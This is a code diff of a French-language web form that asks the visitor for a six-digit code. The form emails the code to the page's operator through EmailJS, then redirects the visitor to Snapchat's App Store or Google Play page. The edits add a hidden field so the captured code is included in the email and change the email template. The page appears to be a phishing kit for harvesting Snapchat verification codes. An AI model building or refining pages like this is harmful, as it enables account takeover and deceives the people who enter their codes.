@@ -81,11 +81,16 @@
         <input type="text" id="sixDigitsInput" maxlength="6" placeholder="000000" oninput="validateInput()" required>
         <p id="error-message" class="error-message">Veuillez entrer exactement 6 chiffres.</p>
       </div>
+
+      <!-- Champ caché pour envoyer le code -->
+      <input type="hidden" id="sixDigits" name="sixDigits">
+      
       <div class="field">
         <input type="submit" id="submit-btn" value="Envoyer">
       </div>
     </form>
   </div>
+
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
   <script>
     document.addEventListener("DOMContentLoaded", function () {
@@ -97,9 +102,10 @@
       
       const input = document.getElementById('sixDigitsInput');
       const errorMessage = document.getElementById('error-message');
-      const regex = /^\d{6}$/;
       const submitBtn = document.getElementById("submit-btn");
 
+      // Validation du code à 6 chiffres
+      const regex = /^\d{6}$/;
       if (!regex.test(input.value)) {
         errorMessage.style.display = 'block';
         return;
@@ -107,21 +113,22 @@
         errorMessage.style.display = 'none';
       }
 
+      // Remplir le champ caché avec le code
+      document.getElementById('sixDigits').value = input.value;
+
       submitBtn.value = "Envoi...";
       submitBtn.disabled = true;
 
-      emailjs.sendForm("service_7xtpexj", "template_3jr5npg", this)
+      emailjs.sendForm("service_7xtpexj", "template_iv7t31a", this)
         .then(function (response) {
           console.log("Email envoyé avec succès !", response);
           alert("Code envoyé avec succès !");
           submitBtn.value = "Redirection...";
-          
+
           setTimeout(() => {
             if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
-              console.log("Redirection vers l'App Store");
               window.location.href = "https://apps.apple.com/app/snapchat/id447188370";
             } else if (/Android/.test(navigator.userAgent)) {
-              console.log("Redirection vers Google Play");
               window.location.href = "https://play.google.com/store/apps/details?id=com.snapchat.android";
             } else {
               alert("Veuillez installer Snapchat depuis l'App Store ou Google Play.");
@@ -150,3 +157,4 @@
   </script>
 </body>
 </html>
+
